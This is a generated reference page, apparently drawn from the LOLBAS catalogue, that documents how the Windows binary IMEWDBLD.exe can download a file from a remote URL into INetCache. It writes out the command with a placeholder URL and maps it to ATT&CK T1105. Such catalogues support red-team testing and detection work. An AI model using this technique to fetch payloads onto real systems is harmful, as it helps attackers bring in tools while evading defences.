---
parsed_by: focuslocust
source: commands
type: generated
---
# IMEWDBLD Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## IMEWDBLD.exe

Tool page: [IMEWDBLD.exe](../../tools/windows/imewdbld.exe.md)

### Download file from Internet

```text
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
```

Description:

IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/IMEWDBLD.yml` |
| Evidence | Command preserved from source parser. |
